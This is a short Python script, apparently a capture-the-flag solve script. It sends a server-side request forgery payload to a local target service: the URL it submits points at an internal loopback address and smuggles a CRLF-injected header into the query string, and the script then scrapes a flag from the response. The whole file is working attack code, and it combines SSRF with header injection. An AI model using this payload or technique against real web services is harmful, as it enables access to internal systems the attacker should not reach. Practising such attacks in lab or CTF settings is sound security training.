import re
from sys import argv
import requests
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 42693)
BASEURL = f"http://{HOST}:{PORT}"

class SSRF:
    def __init__(self, host: str, port: int, querystring: str) -> None:
        self.host = host
        self.port = port
        self.query = querystring

    def http_url(self) -> str:
        return f"http://{self.host}:{self.port}/?{self.query}"
    
with requests.session() as session:
    ssrf = SSRF("127.127.127.127", 8080, "cmd=%0D%0AContent-Type:%20image/png")
    res = requests.post(BASEURL, data={"url": ssrf.http_url()}, headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(re.findall(r"flag\{.*?\}".encode(), res.content))
